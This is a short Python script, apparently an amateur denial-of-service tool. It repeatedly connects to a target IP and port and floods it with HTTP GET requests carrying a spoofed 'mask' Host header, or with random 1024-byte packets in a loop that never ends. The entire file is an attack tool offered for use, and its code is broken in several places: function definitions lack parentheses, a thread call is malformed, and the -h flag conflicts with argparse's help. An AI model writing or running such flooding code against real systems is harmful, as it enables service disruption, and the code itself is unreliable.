#Import Modules
import getopt, sys, os, time, argparse, socket, threading, string, random

#Get full command arguments
full_cmd_arguments = sys.argv

#Parse Only The Argument After The First
argument_list = full_cmd_arguments[1:]

#Add Variables
parser = argparse.ArgumentParser() 

parser.add_argument("--ipv4", "-i", help="Set Target IP ")

parser.add_argument("--port", "-p", help="Set Target Port ")

parser.add_argument("--mask", "-m", help="Set Mask IP ")

parser.add_argument("--http", "-h", help="Set Attack Method to HTTP")

args = parser.parse_args()

mask = socket.gethostbyname(socket.gethostname())

letters = string.ascii_letters

Attack = 2

txtsent = ''.join(random.choice(letters) for i in range(10))

#add if args are used
if args.ipv4:
    print("Set target ip to %s" % args.ipv4)
else:
    print("error: USER INPUT = NULL")
    time.sleep(5)
    print("exiting, Error ID [301]")
    time.sleep(2)
    exit()

if args.port:
    print("Set target port to %s" % args.port)
else:
    args.port = 80

if args.mask:
    print("Set mask to %s" % args.mask)
    mask = args.mask
    
if args.http:
    print("Set attack to http")
    Attack = 1
else:
    Attack = 2

#attack code
while Attack == 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.ipv4, (int)(args.port)))
    print('sending ' "GET /" + args.ipv4 + " HTTP/1.1\r\n")\
    def send_req:
        s.sendto(("GET /" + args.ipv4 + " HTTP/1.1\r\n").encode('ascii'), (args.ipv4, (int)(args.port)))
     
    def mask_send:
        s.sendto(("Host: " +  mask + "\r\n\r\n").encode('ascii'), (args.ipv4, (int)(args.port)))
    if __name__ == "__main__":
        t1 = threading.Thread(target=send_req, 10000)
        t2 = threading.Thread(target=mask_send, 10000)
        
        t1.start()
        t2.start()
        print('sending ' "Host: " + mask + "\r\n\r\n")
        t1.join()
        t2.join()
        print('attac complete')
    
    s.close()

while Attack == 2:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.ipv4, (int)(args.port)))
    print('sending 1024 bytes to ' + args.ipv4)
    rndbytes = os.urandom(1024)
    s.sendto(rndbytes, (args.ipv4, (int)(args.port)))
    time.sleep(0.015)
    s.close()
